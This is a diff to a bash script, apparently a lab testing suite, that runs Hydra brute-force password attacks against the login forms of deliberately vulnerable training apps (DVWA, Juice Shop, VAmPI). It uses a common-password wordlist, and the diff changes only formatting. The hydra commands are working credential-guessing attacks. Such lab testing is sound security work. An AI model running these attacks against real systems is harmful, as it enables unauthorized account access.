@@ -31,7 +31,7 @@ if [[ -z "$WORDLIST" ]]; then
   echo "[+] SecLists not found, creating inline password list..."
   WORDLIST=$(mktemp /tmp/hydra-passwords.XXXXXX)
   trap 'rm -f "${WORDLIST}"' EXIT
-  cat > "${WORDLIST}" <<'PASSEOF'
+  cat >"${WORDLIST}" <<'PASSEOF'
 password
 123456
 12345678
@@ -51,7 +51,7 @@ PASSEOF
 fi
 
 echo "[+] Using password list: ${WORDLIST}"
-PASS_COUNT=$(wc -l < "${WORDLIST}")
+PASS_COUNT=$(wc -l <"${WORDLIST}")
 echo "    Passwords in list: ${PASS_COUNT}"
 echo ""
 
@@ -65,8 +65,8 @@ hydra -l admin -P "${WORDLIST}" \
   "${TARGET}" \
   http-post-form \
   "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
-  -t 4 -f -w 5 -v \
-  || echo "    WARN: hydra DVWA attack returned non-zero (may not have found valid creds)"
+  -t 4 -f -w 5 -v ||
+  echo "    WARN: hydra DVWA attack returned non-zero (may not have found valid creds)"
 
 echo ""
 
@@ -80,8 +80,8 @@ hydra -l "admin@juice-sh.op" -P "${WORDLIST}" \
   "${TARGET}" \
   http-post-form \
   '/juice-shop/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:Invalid:H=Content-Type\: application/json' \
-  -t 4 -f -w 5 -v \
-  || echo "    WARN: hydra Juice Shop attack returned non-zero (may not have found valid creds)"
+  -t 4 -f -w 5 -v ||
+  echo "    WARN: hydra Juice Shop attack returned non-zero (may not have found valid creds)"
 
 echo ""
 
@@ -95,8 +95,8 @@ hydra -l admin -P "${WORDLIST}" \
   "${TARGET}" \
   http-post-form \
   '/vampi/users/v1/login:{"username"\:"^USER^","password"\:"^PASS^"}:error:H=Content-Type\: application/json' \
-  -t 4 -f -w 5 -v \
-  || echo "    WARN: hydra VAmPI attack returned non-zero (may not have found valid creds)"
+  -t 4 -f -w 5 -v ||
+  echo "    WARN: hydra VAmPI attack returned non-zero (may not have found valid creds)"
 
 echo ""
 echo "[*] Hydra brute-force suite complete"
